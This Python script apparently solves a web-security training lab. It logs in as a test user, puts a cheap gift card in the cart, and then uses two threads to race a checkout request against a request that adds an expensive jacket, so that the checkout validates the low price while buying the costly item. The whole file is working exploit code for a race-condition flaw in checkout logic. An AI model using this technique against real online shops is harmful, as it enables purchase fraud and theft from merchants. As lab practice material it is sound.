import sys
import os
import threading
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

# add a gift card (cheap item) to the cart first
lab.post("/cart", data={"productId": 2, "redir": "PRODUCT", "quantity": 1})
lab.info("Added gift card to cart")

# get CSRF token from cart page
page = lab.get("/cart")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# race two endpoints simultaneously:
# 1. checkout (validates price against the cheap gift card)
# 2. add the expensive jacket to cart (swaps cart contents)
# the checkout sees the cheap price, but processes the expensive item
results = {}

def checkout():
    resp = lab.post("/cart/checkout", data={"csrf": csrf}, allow_redirects=False)
    results["checkout"] = resp.status_code

def add_jacket():
    resp = lab.post("/cart", data={"productId": 1, "redir": "PRODUCT", "quantity": 1})
    results["add"] = resp.status_code

lab.info("Racing checkout against cart swap...")

t1 = threading.Thread(target=checkout)
t2 = threading.Thread(target=add_jacket)
t1.start()
t2.start()
t1.join()
t2.join()

lab.info(f"Results: {results}")

lab.check_solved()
